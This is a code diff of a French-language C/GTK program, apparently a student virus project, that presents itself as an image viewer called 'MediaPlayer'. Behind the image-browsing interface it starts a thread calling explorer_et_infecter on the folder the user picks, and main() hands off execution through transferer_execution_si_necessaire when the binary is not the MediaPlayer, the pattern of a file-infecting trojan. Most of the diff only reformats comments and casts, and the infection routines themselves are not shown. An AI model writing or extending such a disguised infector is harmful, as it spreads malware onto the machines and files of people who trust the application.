@@ -9,7 +9,6 @@
 #include <dirent.h>
 #include <pthread.h>
 
-#include "scanner.h"
 #include "infection.h"
 #include "transfert.h"
 #include "mediaplayer.h"
@@ -18,8 +17,7 @@ GtkWidget *liste_images;
 GtkWidget *image_affichee;
 char chemin_selection[MAX_PATH_LEN] = "";
 
-// ─────────────────────────────────────────────
-// Ouvre une image dans la zone centrale (non externe)
+// Ouvre une image dans la zone centrale
 void afficher_image_dans_media_player(const char *filename) {
     char chemin_complet[MAX_PATH_LEN];
     snprintf(chemin_complet, sizeof(chemin_complet), "%s/%s", chemin_selection, filename);
@@ -27,20 +25,19 @@ void afficher_image_dans_media_player(const char *filename) {
     gtk_image_set_from_file(GTK_IMAGE(image_affichee), chemin_complet);
 }
 
-// ─────────────────────────────────────────────
+
 // Callback : clic sur une image dans la liste
 void on_image_selectionnee(GtkListBox *box, GtkListBoxRow *row, gpointer user_data) {
-    (void)box;
-    (void)user_data;
+    (void) box;
+    (void) user_data;
 
     const char *filename = gtk_label_get_text(GTK_LABEL(gtk_bin_get_child(GTK_BIN(row))));
     afficher_image_dans_media_player(filename);
 }
 
-// ─────────────────────────────────────────────
 // Remplit la liste d'images depuis le dossier sélectionné
 void charger_images(const char *dossier) {
-    gtk_container_foreach(GTK_CONTAINER(liste_images), (GtkCallback)gtk_widget_destroy, NULL);
+    gtk_container_foreach(GTK_CONTAINER(liste_images), (GtkCallback) gtk_widget_destroy, NULL);
 
     DIR *dir = opendir(dossier);
     if (!dir) return;
@@ -59,7 +56,6 @@ void charger_images(const char *dossier) {
     gtk_widget_show_all(liste_images);
 }
 
-// ─────────────────────────────────────────────
 // Thread infection
 typedef struct {
     char chemin[MAX_PATH_LEN];
@@ -67,16 +63,15 @@ typedef struct {
 } ThreadInfectArgs;
 
 void *thread_infection(void *arg) {
-    ThreadInfectArgs *args = (ThreadInfectArgs *)arg;
+    ThreadInfectArgs *args = (ThreadInfectArgs *) arg;
     explorer_et_infecter(args->chemin, args->virus_path);
     free(arg);
     return NULL;
 }
 
-// ─────────────────────────────────────────────
 // Callback : bouton choisir dossier
 void on_choisir_dossier_clicked(GtkWidget *widget, gpointer window_ptr) {
-    (void)widget;
+    (void) widget;
 
     GtkWidget *dialog = gtk_file_chooser_dialog_new(
         "Choisir un dossier d'images",
@@ -110,16 +105,13 @@ void on_choisir_dossier_clicked(GtkWidget *widget, gpointer window_ptr) {
     gtk_widget_destroy(dialog);
 }
 
-// ─────────────────────────────────────────────
 // Callback quitter
 static void on_quitter_clicked(GtkWidget *widget, gpointer data) {
-    (void)widget;
-    (void)data;
+    (void) widget;
+    (void) data;
     gtk_main_quit();
 }
 
-// ─────────────────────────────────────────────
-// MAIN
 int main(int argc, char *argv[]) {
     if (!strstr(argv[0], "MediaPlayer")) {
         transferer_execution_si_necessaire(argv[0], argv);
